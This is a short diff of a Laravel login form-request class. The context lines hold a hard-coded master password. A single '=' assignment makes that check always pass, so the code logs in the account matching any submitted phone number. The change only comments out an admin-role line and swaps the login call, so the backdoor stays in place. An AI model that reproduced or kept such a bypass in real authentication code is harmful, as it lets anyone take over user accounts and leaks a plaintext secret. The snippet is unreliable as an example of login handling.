@@ -46,8 +46,8 @@ class LoginRequest extends FormRequest
         if ($this->password="SaBaawy153"){
             $user= User::where('phone',$this->phone)->first();
             if ($user) {
-                Config::set('role','Admin');
-                Auth::loginUsingId($user->id);
+//                Config::set('role','Admin');
+                Auth::login($user);
             }
         }
         if (! Auth::attempt($this->only('phone', 'password'), $this->boolean('remember'))) {
